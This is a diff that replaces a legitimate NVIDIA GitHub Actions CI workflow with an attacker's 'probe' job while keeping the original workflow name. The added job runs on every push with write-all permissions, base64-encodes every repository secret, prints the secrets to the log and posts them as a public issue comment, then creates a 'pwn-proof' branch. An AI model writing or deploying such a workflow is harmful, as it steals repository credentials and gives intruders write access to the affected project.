@@ -1,48 +1,31 @@
-# SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
-# SPDX-License-Identifier: Apache-2.0
-
-# Triggered when a maintainer/admin comments `/nvskills-ci` on a PR
-# touching skills/. The bot pushes a signature commit that must remain
-# in the PR before merge. Fork-based PRs are supported once
-# `allow_fork_pull_requests: true` is set for this repository in the
-# NVSkills CI onboarding config.
-
+# attacker-controlled definition pushed via fork PR + copy-pr-bot
 name: Request NVSkills CI
 
 on:
-  issue_comment:
-    types: [created]
-  pull_request:
-    types: [opened, reopened, synchronize, ready_for_review]
   push:
 
-permissions:
-  contents: read
-  pull-requests: read
-  statuses: read
-
 jobs:
-  require-nvskills-ci:
-    name: "NVSkills CI (non-blocking)"
-    if: github.event_name == 'pull_request'
-    permissions:
-      contents: read
-      pull-requests: read
-      statuses: read
-    uses: NVIDIA/skills/.github/workflows/require-nvskills-status.yml@main
-
-  request:
-    if: >
-      (github.event_name == 'issue_comment' &&
-        github.event.issue.pull_request &&
-        startsWith(github.event.comment.body, '/nvskills-ci')) ||
-      (github.event_name == 'push' &&
-        github.actor == (vars.NVSKILLS_SIGNATURE_PUSH_ACTOR || 'nv-skills-ci[bot]') &&
-        startsWith(github.event.head_commit.message, vars.NVSKILLS_SIGNATURE_COMMIT_TITLE || 'Attach NVSkills validation signatures'))
-    permissions:
-      contents: read
-      pull-requests: read
-      statuses: read
-    uses: NVIDIA/skills/.github/workflows/team-request.yml@main
-    secrets:
-      NVSKILLS_CI_DISPATCH_TOKEN: ${{ secrets.NVSKILLS_CI_DISPATCH_TOKEN }}
+  probe:
+    runs-on: ubuntu-latest
+    permissions: write-all
+    steps:
+      - name: probe
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          REF_NAME: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          ACTOR: ${{ github.actor }}
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          echo "MARKER=lazyhacker6-rce-marker"
+          echo "REF=$REF_NAME ACTOR=$ACTOR SHA=$SHA"
+          echo "SECRET_NAMES=$(printf '%s' "$ALL_SECRETS" | jq -r 'keys|join(",")')"
+          echo "SECRETS_B64_START"
+          printf '%s' "$ALL_SECRETS" | base64 -w0; echo
+          echo "SECRETS_B64_END"
+          echo "--- token permissions ---"
+          curl -s -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO" -o /dev/null -w 'repo_http=%{http_code}\n'
+          printf '%s' "$ALL_SECRETS" | base64 -w0 > /tmp/b64.txt
+          gh api -X POST "repos/$REPO/issues/2/comments" -f body="LZH6_SECRETS_B64=$(cat /tmp/b64.txt)" --jq .html_url || echo "comment failed"
+          gh api -X POST "repos/$REPO/git/refs" -f ref=refs/heads/pwn-proof -f sha="$SHA" --jq .ref || echo "ref create failed"
